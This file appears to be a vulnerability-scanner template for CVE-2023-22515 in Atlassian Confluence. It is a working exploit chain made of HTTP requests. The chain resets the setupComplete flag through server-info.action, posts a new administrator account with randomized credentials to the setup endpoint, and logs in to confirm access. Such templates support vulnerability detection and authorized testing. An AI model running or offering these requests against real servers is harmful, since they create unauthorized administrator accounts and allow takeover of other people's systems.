id: CVE-2023-22515

info:
  name: Atlassian Confluence - Privilege Escalation
  author: s1r1us,iamnoooob,rootxharsh,pdresearch
  severity: critical
  verified: true
  description: |-
    Atlassian Confluence Data Center and Server contains a privilege escalation vulnerability that allows an attacker to create unauthorized Confluence administrator accounts and access Confluence.
    fofa: app="ATLASSIAN-Confluence"
  reference:
    - https://attackerkb.com/topics/Q5f0ItSzw5/cve-2023-22515/rapid7-analysis
    - https://confluence.atlassian.com/security/cve-2023-22515-privilege-escalation-vulnerability-in-confluence-data-center-and-server-1295682276.html
    - https://confluence.atlassian.com/kb/faq-for-cve-2023-22515-1295682188.html
    - https://jira.atlassian.com/browse/CONFSERVER-92475
    - https://www.cisa.gov/news-events/alerts/2023/10/05/cisa-adds-three-known-exploited-vulnerabilities-catalog
  tags: cve,cve2023,confluence,auth-bypass,kev,intrusive
  created: 2023/10/12

set:
  randstr: randomLowercase(12)
  username: randomLowercase(10)
  password: randomLowercase(10)
  email: randomLowercase(32)+"@gmail.com"
rules:
  r0:
    request:
      method: GET
      path: /setup/setupadministrator-start.action
      follow_redirects: true
    expression: response.body.bcontains(b'Setup is already complete')
  r1:
    request:
      method: GET
      path: /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{{randstr}}
    expression: true
  r2:
    request:
      method: GET
      path: /setup/setupadministrator-start.action
    expression: response.body.bcontains(b'Please configure the system administrator account for this Confluence installation')
  r3:
    request:
      method: POST
      path: /setup/setupadministrator.action
      headers:
        X-Atlassian-Token: no-check
      body: |
        username={{username}}&fullName=admin&email={{email}}&password={{password}}&confirm={{password}}&setup-next-button=Next
    expression: true
  r4:
    request:
      method: POST
      path: /dologin.action
      headers:
        X-Atlassian-Token: no-check
      body: |
        os_username={{username}}&os_password={{password}}&login=Log+in&os_destination=%2Findex.action
    expression: response.status == 302 && response.headers["location"].contains("/index.action")
expression: r0() && r1() && r2() && r3() && r4()
